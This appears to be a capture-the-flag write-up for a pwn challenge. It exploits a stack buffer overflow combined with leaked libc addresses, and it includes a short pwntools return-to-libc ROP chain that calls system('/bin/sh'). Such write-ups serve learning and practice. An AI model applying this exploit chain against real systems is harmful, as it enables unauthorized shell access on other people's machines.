## Vulnerability Explanation

The binary leaks three **libc function addresses** (`fread`, `fwrite`, `fseek`) and then reads up to 120 bytes into a 32‑byte stack buffer without bounds checks. This classic **buffer overflow + info‑leak** lets us:

1. **Resolve libc**: Using any leaked symbol and its offset, we compute the libc base.
2. **Return‑to‑libc**: Build a ROP chain to call `system("/bin/sh")`.

## Exploitation Steps

1. **Leak addresses**  
   Parse the three printed pointers:

   ```c
   fread() at …
   fwrite() at …
   fseek() at …
   ```

2. **Identify libc version**
   Paste any one leak into https://libc.blukat.me to download the matching libc.so and its symbol offsets.

3. **Bild the ROP chain according to the offset calculated**:
   ```py
   padding = b"A"*40
   rop     = flat(
   p64(pop_rdi),
   p64(bin_sh),
   p64(ret),
   p64(system)
   )
   r.sendline(padding + rop)
   ```

### Flag: ghctf{bl1nd_pwn...}
